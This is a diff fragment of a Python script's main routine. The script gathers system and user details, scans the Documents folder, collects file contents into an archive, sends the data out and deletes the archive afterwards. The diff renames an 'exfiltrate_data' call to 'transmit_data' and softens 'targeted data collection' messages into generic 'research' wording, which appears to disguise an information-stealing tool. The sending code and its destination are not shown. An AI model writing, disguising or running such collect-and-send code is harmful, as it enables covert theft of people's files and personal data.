-        transmission_result = researcher.exfiltrate_data(archive_path)
+        transmission_result = researcher.transmit_data(archive_path)
         
-        # Research Summary
-        print("\n" + "=" * 60)
-        print("📊 FOCUSED RESEARCH SUMMARY:")
-        print("=" * 60)
-        print(f"  - System Info: Collected")
-        print(f"  - Workspace: {workspace_data['file_count']} files")
-        print(f"  - Target Directories: {len([d for d in target_data.values() if d.get('exists')])} scanned")
-        print(f"  - File Contents: {len(file_contents)} files collected")
+        # Summary
+        print("\n" + "=" * 50)
+        print("📊 RESEARCH SUMMARY:")
+        print("=" * 50)
+        print(f"System: {system_info['platform']}")
+        print(f"User: {system_info['user']}")
         
-        if transmission_result:
-            print(f"  - Metadata Transmitted: {'Yes' if transmission_result.get('metadata_sent') else 'No'}")
-            print(f"  - Files Transmitted: {transmission_result.get('files_sent', 0)}/{transmission_result.get('total_files', 0)}")
-            print(f"  - Archive Transmitted: {'Yes' if transmission_result.get('archive_sent') else 'No'}")
+        if documents_data.get('exists'):
+            print(f"Documents: {documents_data['file_count']} files, {documents_data['total_size']:,} bytes")
+            print(f"Notable files: {len(documents_data.get('notable_files', []))}")
+            print(f"Contents collected: {len(file_contents)} files")
         
-        # Show directory-specific results
-        print("\n📁 TARGET DIRECTORY SCAN RESULTS:")
-        for dir_path, data in target_data.items():
-            if data.get('exists'):
-                print(f"  - {Path(dir_path).name}: {data.get('file_count', 0)} files, {data.get('total_size', 0):,} bytes")
+        if transmission_result and 'error' not in transmission_result:
+            print(f"Data transmitted: {transmission_result['files_sent']} files")
         
-        print("\n" + "=" * 60)
-        print("✅ FOCUSED RESEARCH COMPLETED")
-        print("Targeted data collection finished successfully")
+        print("\n✅ RESEARCH COMPLETED")
         
     except KeyboardInterrupt:
-        print("\n⚠️  Research interrupted by user")
+        print("\n⚠️  Research interrupted")
     except Exception as e:
-        print(f"❌ Research error: {e}")
-        import traceback
-        traceback.print_exc()
+        print(f"\n❌ Research error: {e}")
     finally:
-        # Cleanup
-        if archive_path and os.path.exists(archive_path):
+        if archive_path:
             researcher.cleanup(archive_path)
 
 
